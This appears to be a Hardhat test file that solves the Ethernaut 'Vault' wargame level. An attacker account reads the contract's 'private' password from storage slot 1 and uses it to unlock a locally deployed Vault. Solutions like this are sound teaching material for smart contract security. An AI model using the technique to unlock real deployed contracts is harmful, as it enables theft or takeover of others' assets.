import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Vault} from '../../types/typechain';
import {getStorage} from '../../utils';

describe('Ethernaut 8: Vault', () => {
  let contract: Vault;

  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  const PASSWORD = ethers.utils.randomBytes(32);

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Vault', owner).then(f => f.deploy(PASSWORD));
    await contract.deployed();
  });

  it('should read private data & unlock', async () => {
    // initially it is locked
    expect(await contract.connect(attacker).locked()).to.be.true;

    // read storage (slot #1)
    const password = getStorage(contract.address, 1);

    // unlock with the private password
    await contract.connect(attacker).unlock(password);
  });

  after(async () => {
    // should be unlocked now
    expect(await contract.locked()).to.be.false;
  });
});
